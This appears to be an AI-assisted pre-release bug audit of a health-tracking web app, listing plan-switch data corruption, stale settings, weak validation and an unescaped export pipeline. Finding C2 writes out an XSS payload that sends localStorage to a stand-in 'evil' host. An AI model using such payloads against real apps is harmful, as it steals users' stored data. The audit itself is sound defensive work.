# Protocol Health — v7.10.x Aggressive Bug Audit (pre-175-workouts)

## Context

User requested an aggressive top-down + bottom-up bug scan of the entire codebase before adding 175 workouts. Goal: identify data misplacement, silent corruption, security issues, calculation errors, plan/tab bugs. Six parallel Explore agents were deployed; ~140 findings returned, triaged hard against the actual code (past agents have ~30% accuracy). This document is the consolidated bug report. **No fixes here** — the user explicitly asked "don't fix anything yet at all. You must just brutally dig for bugs entirely only." Fixes happen in a follow-up release plan after approval.

**Out of scope this pass:** WORKOUTS_LIBRARY.md (incomplete, would create false positives in scans) and the 175-workouts content addition itself.

---

## Severity Legend

- **CRITICAL** — confirmed data corruption, silent calculation error, or exploitable XSS path. User health decisions affected.
- **HIGH** — confirmed bug reachable by normal user flows. Wrong number visible or stored in storage.
- **MEDIUM** — confirmed bug reachable by edge case (rare data, plan switch, etc.). Visible but recoverable.
- **LOW** — bug confirmed but cosmetic, dead code, or documented limitation.

Each finding cites file:line. False-positive findings from agents are listed separately at the bottom for transparency.

## CRITICAL bugs

### C1. Cross-plan checklist ID semantic conflicts — data corruption on plan switch

**Files:** `plans/lite.js:67-87`, `plans/agro.js:62-85`, `plans/cut.js:60-82`, `plans/bulk.js:62-84`, `plans/maintenance.js:62-83`.

The same checklist IDs mean completely different things across plans. When a user switches plans, old check values persist in `SK.dayLogs[date].checks` under those same IDs, but the rendered label is now the new plan's. `migrateOrphanedChecks` only deletes IDs not in the new plan — it doesn't touch IDs that exist in both plans with different meanings.

Concrete examples (verified by reading all five plan files):

| ID | LITE | AGRO | CUT | BULK | MAINTENANCE |
|----|------|------|-----|------|------------|
| `m2` | Morning movement (walk) | 10 min mobility (CARs + neck) | Morning training session | Morning training session | Today's movement session |
| `m3` | Protein-rich breakfast | Morning workout (20 min) | Protein-rich breakfast | Protein-rich breakfast | Balanced breakfast |
| `f1` | Protein in every meal | Protein in first meal (60-70g) | Stayed under calorie ceiling | Hit calorie ceiling (surplus) | Ate near TDEE |
| `e1` | Afternoon/evening session | Change clothes on arriving home | Post-training stretch | Post-training stretch | Post-session stretch |
| `e2` | Light stretch before bed | Evening session (40-45 min) | 15+ min walk | Light walk on rest days | Moved 30+ minutes |
| `n1` | Wind down by 10PM | (not present) | No food 2hrs before bed | Sleep 7-9 hours | Wind down routine |
| **`n2`** | **Sleep 7-8 hrs** | **Sleep before midnight** | **Sleep 7-9 hrs** | **MONTHLY BODY COMP CHECK** | **Sleep 7-8 hrs** |

The most damaging: **`n2` is "Sleep 7-9 hrs" in 4 plans but "Monthly body comp check" in BULK.** A user who ticked `n2` on AGRO ("slept before midnight done") and switches to BULK will have `n2:true` rendered as "Monthly body comp check — done" without ever doing it. Compliance % is wrong. Calendar coloring is wrong. Calibration's exclusion logic (which uses checklist completion) is wrong.

`f1` has 5 different definitions across plans — the worst possible case for stale-state corruption.

Fix direction (do not implement yet): either prefix IDs by plan key (`agro.m2`, `lite.m2`) or clear stale `checks{}` entries for IDs whose label changed on plan switch. Per CLAUDE.md storage versioning rules, this likely needs a schema migration (`ph_dl_v1` → `ph_dl_v2`).

### C2. Markdown export pipeline is XSS-able via food names / notes

**Files:** `modules/export.js:393` (food name in markdown), `modules/export.js:591` (notes in markdown), `modules/export.js:610` (`box.innerHTML = renderMarkdownPreview(md)`), `modules/export.js:703` (downloaded HTML file embeds the same), `modules/export.js:664-666` (`inlineFormat` only handles `**bold**` and trailing line break — passes everything else through).

Verified by reading the code:

```js
// export.js:393 — food name not escaped
out += `- ${e.name} — ${e.calories} cal${macros}\n`;

// export.js:591 — notes not escaped
md += `> ${log.notes.replace(/\n/g, '\n> ')}\n`;

// export.js:610 — markdown rendered as HTML
box.innerHTML = renderMarkdownPreview(md);

// export.js:664 — inlineFormat does NOT escape HTML, only formats **bold**
export function inlineFormat(s) {
  return s.replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>').replace(/ {2}$/, '<br>');
}
```

A user (or tampered backup) putting `<script>alert(1)</script>` or `<img src=x onerror=fetch('//evil/'+localStorage.ph_st_v1)>` in a food name → opens TRACK → tap EXPORT → preview renders → script executes. Same payload survives into the downloaded `.html` file (line 703).

Threat model: even though there's no remote attacker, the self-XSS path is exploitable through:
- Importing a backup from someone else's protocol
- Manually-edited storage via DevTools
- Future shared-protocol features

Other render paths in the app (`renderTrackFoodLog`, `renderRecentNotes`, `calendar.js:300-301`) DO use `esc()` correctly. The export pipeline is the only place that skipped it.

### C3. Settings panel TDEE field stale after auto-recompute / calibration

**Files:** `app.html:3611` (openSettings sets field.value once), `app.html:4290-4302` (recomputeAndApplyTDEE updates s.tdee + dispatches TDEE_CHANGED), `app.html:2453` (DISPATCH_MAP.TDEE_CHANGED = ['projection','durationBar','goalBar','nutritionMacros','radar'] — does NOT include settings field).

Sequence that produces stale display:
1. User opens Settings, sees TDEE = 3022 (current).
2. Background: auto-calibration runs (e.g., user just logged a weight in another tab), updates `s.tdee` to 3100, dispatches TDEE_CHANGED.
3. TDEE_CHANGED dispatch handlers update projection/goalBar/radar/etc. but the Settings panel TDEE input still reads 3022.
4. User edits another field (e.g., target weight) and taps CONFIRM PLAN → `confirmPlan` reads `settingTdee.value` (still 3022) and writes it back as `s.tdee`, **clobbering the auto-calibrated 3100**.

This is a real data-loss path: the calibration system silently fights with the Settings panel's stale read.

Severity is CRITICAL because it undoes calibration work and is invisible to the user. Marked CRITICAL despite agent calling it MEDIUM, because it's a silent data write-back of stale value.

## HIGH bugs

### H1. `applyInferredActivityLevel` persists `s.activityByDayType` across plan switches

**File:** `app.html:4166-4207`.

Logic in `getWeeklyAvgActivity` (app.html:3916ish) prioritizes `settings.activityByDayType` (user override) over `plan.activityByDayType` (plan default). When a user applies activity inference on AGRO (whose plan map is `{eatDay:1.70, fastDay:1.35}`), the result is written to `s.activityByDayType`. If they switch to LITE (whose plan map is `{eatDay:1.375, fastDay:1.20}`), the AGRO-based override survives and is used as LITE's activity, producing a 19%+ wrong TDEE.

No "clear on plan switch" logic exists. Confirmed by reading `confirmPlan` (app.html:3801-3842) — it doesn't reset `s.activityByDayType`.

### H2. Exercise level selector writes to TODAY when user is viewing a past day modal

**File:** `app.html:2392-2402` (setExerciseLevel hardcodes `today = todayStr()`), `app.html:2380-2390` (getCurrentExerciseLevel walks back 90 days).

The level badge in `exRowWithLevel` (`components/workout-card.js:23`) is rendered into both the WORKOUTS tab (today-context) AND the day-modal workout panel (past-date context). Both render paths use the same `openLevelSelector(instanceKey, groupId)` onclick handler, which calls `setExerciseLevel` with no date argument. The handler writes to `SK.exLevels[todayStr()]`.

So a user reviewing Monday's workouts in the day modal on Wednesday taps a level badge → updates Wednesday's exercise level, not Monday's. Silent cross-day side effect.

Display consequence: getCurrentExerciseLevel walks back 90 days for the most recent level set, so the change DOES propagate visually. But the intent ("change historical record") is never honored.

### H4. `setCurrentWeight` / settings panel — three different validation bounds for current-weight input

**Files:** `app.html:966` (HTML `min="50" max="250"`), `app.html:3810-3812` (confirmPlan: `if(!isNaN(curInput) && curInput > 0)`), `app.html:3859` (setCurrentWeight: `if(isNaN(val) || val < 20 || val > 300)`).

Three sources of truth disagree. A user can:
- Enter 30 kg via the Settings panel (HTML blocks it but parsing accepts > 0).
- Enter 250 kg via Settings (HTML accepts) — but setCurrentWeight allows up to 300.
- Enter 25 kg via setCurrentWeight from the checklist path — bypassing Settings panel min=50.

No single bound governs the field. Consequences range from impossible weights getting stored to confusing "sanity rejection" messages.

### H5. Backup restore lacks type validation; tampered backup can corrupt downstream consumers

**File:** `app.html:5370-5376` (`_commitBackupRestore`).

```js
Object.entries(backup.data).forEach(([key, val]) => {
  const storageKey = SK[key];
  if(storageKey) ss(storageKey, val);  // writes whatever value is in the backup
  // ...
});
```

No `instanceof Array` / `typeof === 'object'` checks. If a malicious or hand-edited backup has `weights: "not-an-array"`, downstream consumers will throw or behave unexpectedly:
- `getDayCalories` does `entries.reduce(...)` (line 2198) — TypeError on non-array.
- `renderWeights` does `weights.forEach(...)` — TypeError.
- `gs(SK.weights)||[]` doesn't help here; the stored value IS truthy, just wrong type.

The checksum validates content integrity but a user-confirmed override path bypasses it (which is by design but worth noting). After "RESTORE ANYWAY" on a tampered backup, the app can be put into an unrecoverable broken state without the user's data being touched on disk by the malicious payload itself.

## MEDIUM bugs

### M1. `onLinkedOffsetInput` accepts out-of-bounds values into storage

**File:** `app.html:4210-4225`.

```js
function onLinkedOffsetInput() {
  const raw = document.getElementById('settingTargetOffset').value;
  const v = parseFloat(raw);
  if (isNaN(v)) return;          // guards NaN
  const s = getSettings();
  s.targetOffset = Math.round(v); // saves any number, no bounds check

```

HTML has min/max attrs but JS doesn't enforce them. User can paste `-9999` or use DevTools — gets stored. The downstream `syncCalorieCeilingFromOffset` clamps at compute time so the math is right, but `s.targetOffset` in storage is corrupted. A future feature that reads `targetOffset` directly (e.g., for analytics) would see the corrupt value.

### M6. `idbSyncAll` 2-second deferred timer can race with rapid early writes

**File:** `app.html:5602` (`setTimeout(() => idbSyncAll(), 2000)`).

If the user triggers writes (weight log, food log) in the first 2 seconds after init, both `ss()` (which calls `idbPut` synchronously per write) and the eventual `idbSyncAll` race. In practice not a corruption risk because `ss()` itself mirrors per-write, but on a slow device the IDB write may not have committed before the full sync runs over it.

Documented as LOW-RISK by the data-integrity audit; agreed.

## LOW bugs / known limitations

### L1. `ss()` returns no success/fail signal

Already documented in v7.10.2 UPDATE_LOG as deferred. Codebase-wide refactor needed for caller-aware quota handling.

### L2. `getValidCheckCompletion` uses current plan's checklist for historical fast/light days marked under previous plan

Already documented in v7.10.2 as deferred. Distinguishing requires per-day plan history (schema change).

### L3. `SK.checklist` is a dead key

Defined at `app.html:1705` but never read or written. Wastes ~200 bytes in backups. Not a bug, just cleanup.

### L4. Migration auto-backup auto-download might fail silently if browser blocks downloads

**File:** `migrations/runner.js:73-86`. The `downloadJson` helper triggers a browser download via blob URL + click. If the browser blocks the download (popup blocker, "auto-download" disabled), `downloaded` returns false and migrations halt. Currently surfaces with a console error and `{ok:false, error:'backup-failed'}`. The user-visible message says "Data migration failed" but doesn't explain WHY — could be confusing.

### L5. `WORKOUT_CHECKED` dispatch doesn't include `calendarCell`

**File:** `app.html:2459` (`WORKOUT_CHECKED: ['recentNotes','autoItems']`).

Workouts audit Finding #7. When user ticks an exercise on TODAY, `workoutTodayDone` increases, which can flip `_workout` to true (≥80%), which would change today's calendar coloring. But `WORKOUT_CHECKED` doesn't dispatch to `calendarCell`. The cell only refreshes when MONTHS tab is next opened (which calls `renderCalendar()`).

In practice the calendar is not visible during workout check-off (user is on TODAY or WORKOUTS tab), so this is mostly cosmetic. Add `calendarCell` to the dispatch targets if the calendar tab is ever shown alongside (e.g., in a future split-view).

### L6. Workout checks orphan across plan switches (BY DESIGN)

**File:** `app.html:2935-2937` (`migrateOrphanedChecks` whitelists `wex*` IDs).

Workouts audit Finding #10. When user switches AGRO → LITE, old AGRO `wex0..wex111` checks remain in `dayLog.workoutChecks`. They aren't rendered (LITE renders different exercises with different wex indices), but they survive in storage. If user returns to AGRO, the old ticks reappear. **This is intentional** to preserve workout history across plan switches. Documented here because it's surprising-but-correct behavior.

## SPECULATIVE / requires live diagnostics

Possible causes: stale render, service-worker cache, mid-modal tick that didn't trigger re-render. **Action: add a console diagnostic in renderCalendar that prints `dateStr, vc.done, vc.total, _pastBroken` for each fast cell during dev so user can capture live values when symptom recurs.**

### M7. `_workout` pseudo-item not auto-derived for past days — promoted from speculative to MEDIUM

Promoted by the workouts audit (Finding #6). `refreshAutoItems` runs only for TODAY (`getDayLog(todayStr())`). If a user retroactively logs all workouts for a past day via the day modal's workout panel, `_workout: true` does NOT get set automatically for that date until the next app init (where `migrateOrphanedChecks` walks all dayLogs and back-fills _workout per app.html:2954-2958).

**Fix direction:** After `toggleModalWorkoutEx` saves to a past dayLog, call a per-date recompute (analogous to refreshAutoItems but parameterized by dateStr) that derives _workout from `workoutTodayDone/Total >= 0.8`. Or: fire a `WORKOUT_CHECKED` dispatch with the dateStr in event detail so the recompute can target the right day.

## Discounted false positives (transparency)

These were claimed by audit agents but verified false:

- **"calcDuration dimensional analysis errors"** (math agent earlier round) — Already discounted in v7.10.1 audit. Hand-checked: `Math.ceil(totalCalChange / (kgPerWeek × 7700 / 7))` correctly produces days. Agent's proposed "fix" would produce 210,000 days for a 4-week goal.
- **"Future date weight logging in day modal"** (UI agent earlier round) — `if(isFuture)` branch in `openDayModal` already gates the weight/water/notes/checklist fields off. Agent saw `isFuture` declared but missed the `else` branch.
- **"Mutable date in for-loop" pattern in 4 files** — None of the loop variables are aliased post-loop. Style nit, not a bug.
- **"FULL_DAYS hoisting race in visibilitychange"** — `const` is hoisted; handler body executes when event fires (post-load).
- **"`fast-window.js` parses ISO date strings as UTC"** — `new Date("YYYY-MM-DDTHH:mm")` (no Z) is parsed as LOCAL time per ECMAScript spec. Round-trip through `toISOString()` preserves the same instant.
- **"`export.js:65` Math.round vs Math.floor for day-span"** — Verified mentally with DST scenarios; Math.round produces correct day counts; Math.floor would actually be wrong for 23-hour DST days.
- **"PLAN_ACTIVITY_DEFAULTS LITE 1.375 is wrong"** — Intentional rounding to nearest dropdown step. Plan's `activityByDayType` produces weighted 1.30; dropdown options are [1.2, 1.375, 1.55, 1.725, 1.9]; 1.375 is closer than 1.2.
- **"`_wexCounter` not reset before all `plan.workoutContent()` calls"** — Both call sites (`renderWorkouts` at app.html:3312 and the day-modal workout panel at calendar.js:435+481) correctly call `_resetExRowInstances()` before AND after rendering.
- **"`restoreData` bypasses migrations"** — Verified false: `_commitBackupRestore` writes `SK.schemaVersion` from the backup, so a backup with older schema causes runMigrations to replay on next load.
- **"FOOD_LOGGED radar conditional render"** — By design: TRACK-tab-only render is intentional; switchTab calls renderRadar() when entering TRACK.
- **"ss() partial-write on QuotaExceededError"** — localStorage is atomic per-key. The "partial" is across multiple ss() calls which is unavoidable without a transaction layer. Already documented as deferred.

## Verification approach used

For each agent finding:
1. Read the cited file:line directly (not relying on agent paraphrase).
2. For math claims, computed by hand with concrete inputs.
3. For data-flow claims, traced storage write → dispatch → render path end to end.
4. Marked CONFIRMED only when the symptom was reproducible from code; SPECULATIVE only when reasoning was clean but symptom unverifiable from data alone; DISCOUNTED when the agent's claim contradicted what the code actually does.

Past agent runs have produced ~30% accuracy. This audit's confirmed-bugs list is what survived strict verification.
